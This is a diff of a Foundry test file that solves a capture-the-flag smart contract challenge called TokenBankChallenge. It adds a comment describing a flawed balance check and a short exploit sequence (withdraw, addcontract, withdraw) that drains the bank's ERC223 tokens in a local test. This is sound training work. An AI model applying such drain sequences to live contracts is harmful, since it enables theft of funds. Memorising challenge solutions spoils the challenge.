@@ -16,13 +16,23 @@ contract TankBankTest is Test {
         tokenBankAttacker = new TokenBankAttacker(address(tokenBankChallenge));
 
         // Put your solution here
-        SimpleERC223Token token =  tokenBankChallenge.token();
-        console.log("tokenBankChallenge balance for SimpleERC223Token",token.balanceOf(address(tokenBankChallenge))); // goal: 1000000000000000000000000 => 0
-        console.log("player balance for player",token.balanceOf(player));
+        /**
+            1. Call withdraw function of tokenBankChallenge twice,each time make sure the player's  balance for TokenBankChallenge equal:500000 * 10 ** 18
+            2: Player will get 500000 * 10 ** 18 TokenBankChallenge Token in the beginning, after call withdraw first time, and use addcontract to make the play get
+            the same TokenBankChallenge Token again. 
+            3. Because the TokenBankChallenge mistakely judge its token's balance before transfer SimpleERC223Token token, So caller can transfer  any amount of SimpleERC223Token token
+            if the caller has enough TokenBankChallenge token.
+         */
+        SimpleERC223Token token =  SimpleERC223Token(tokenBankChallenge.token());
 
-        //  mapping(address => uint256) storage test = tokenBankChallenge.balanceOf(pla);
+        vm.startPrank(player);
 
-        console.log("player balance for tokenBankChallenge",tokenBankChallenge.balanceOf(player));
+        tokenBankChallenge.withdraw(tokenBankChallenge.balanceOf(player));
+        tokenBankChallenge.addcontract(player);
+        tokenBankChallenge.withdraw(tokenBankChallenge.balanceOf(player));
+
+
+        vm.stopPrank();
 
         _checkSolved();
     }
